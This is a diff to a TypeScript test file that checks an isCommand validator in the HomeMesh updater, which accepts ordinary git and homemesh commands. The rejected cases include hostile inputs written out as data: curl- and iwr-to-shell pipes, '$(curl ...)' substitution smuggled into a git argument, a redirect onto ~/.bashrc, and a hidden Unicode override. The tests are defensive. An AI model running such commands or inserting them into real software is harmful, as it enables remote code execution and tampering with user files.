@@ -6,7 +6,7 @@ import type { NodeSummary } from "../api/types";
 import {
   ACTIVE_ROW_STATES, DISMISS_AFTER_S, FINAL_STATUSES, HUB_UPDATE_KEY, NO_WORD_AFTER_S, PHASES, PHASE_LABELS, RESTART_PHASES,
   RUN_ID_PATTERN, SHA_PATTERN, SUCCESS_STATUSES, ago, canCheck, clearHubUpdate, commandSourceDir, formatElapsed, hubUpdateRecord,
-  installerCommand, isRunId, isSha, panelState, phaseLabel, readHubUpdate, reconcileHubUpdate, safeInstallerCommand, shQuote, shortDate,
+  installerCommand, isCommand, isRunId, isSha, panelState, phaseLabel, readHubUpdate, reconcileHubUpdate, safeInstallerCommand, shQuote, shortDate,
   shortSha, splitCode, updatableCheck, updateLogText, writeHubUpdate,
 } from "../lib/update";
 import { MIN, NOW, SHA_B, build, hubNode, iso, node, report, result, row, stored, storedError } from "./updateFixtures";
@@ -132,6 +132,29 @@ describe("splitCode", () => {
   });
   it("leaves unbalanced backticks alone", () => {
     expect(splitCode("a ` b")).toEqual([{ code: false, text: "a ` b" }]);
+  });
+});
+
+describe("isCommand (which hint code gets a Copy button)", () => {
+  it("accepts every command of the error table, filled in", () => {
+    for (const cmd of [
+      "homemesh update allow", "homemesh update status", "homemesh update", "homemesh config validate", "homemesh start",
+      "journalctl --user -u 'homemesh-update-*' -n 50", "winget install Git.Git", "gh auth setup-git",
+      "git -C /home/ann/src/HomeMesh status", "git -C C:\\Users\\Ann O'Neil\\src\\HomeMesh fetch",
+      "git -C /home/ann/src/HomeMesh branch --set-upstream-to=origin/main", "git -C /home/ann/src/HomeMesh log origin/main..HEAD",
+      "git config --global --add safe.directory /home/ann/src/HomeMesh", "git -C /home/ann/src/HomeMesh remote -v",
+      "git -C /home/ann/src/HomeMesh merge --ff-only", "loginctl enable-linger $USER",
+    ]) expect(isCommand(cmd), cmd).toBe(true);
+  });
+  it("refuses code that would chain, substitute or redirect (a hint arrives from that computer)", () => {
+    for (const cmd of [
+      "homemesh update allow; iwr http://x.invalid/a | iex", "homemesh update allow && curl x | sh", "homemesh update status | sh",
+      "git -C $(curl -s x.invalid) status", "git -C ${IFS}x status", "git -C (iwr x.invalid) status", "git -C @(iwr x) status",
+      "homemesh update status > ~/.bashrc", "git -C /src switch <branch>", "git -C x!! status", "homemesh update & calc",
+      "git -C {iwr x} status",
+    ]) expect(isCommand(cmd), cmd).toBe(false);
+    expect(isCommand("ls -la")).toBe(false);
+    expect(isCommand("homemesh update status\u202e")).toBe(false);
   });
 });
 
